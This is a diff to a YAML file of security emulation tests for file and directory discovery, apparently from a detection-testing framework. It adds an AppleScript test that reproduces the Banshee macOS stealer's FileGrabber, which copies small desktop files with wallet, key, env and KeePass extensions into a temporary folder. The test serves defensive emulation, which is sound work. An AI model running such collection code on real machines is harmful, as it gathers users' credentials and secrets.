@@ -1,5 +1,31 @@
 name: File and Directory Discovery
 tests:
+  - name: Copy files from desktop
+    description: FileGrabber grabs files from desktop and copies them to a temporary folder
+    reference: https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect
+    language: AppleScript
+    command: |
+      set fileGrabberFolderPath to "#{destinationPath}"
+      set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key", "env", "md", "kdbx"}
+
+      try
+       	set desktopFiles to every file of desktop
+       	repeat with aFile in desktopFiles
+        		try
+       			  set fileExtension to name extension of aFile
+         			if fileExtension is in extensionsList then
+        				set fileSize to size of aFile
+        				if fileSize < 51200 then
+         					set destinationFolder to (POSIX file fileGrabberFolderPath) as alias
+         					duplicate aFile to destinationFolder with replacing
+        				end if
+         			end if
+        		end try
+       	end repeat
+      end try
+    args:
+      destinationPath: "/tmp/FileGrabber"
+
   - name: List files and directories in Macintosh HD
     description: Enumerate files and directories in the root filesystem using Finder application via AppleScript
     language: AppleScript
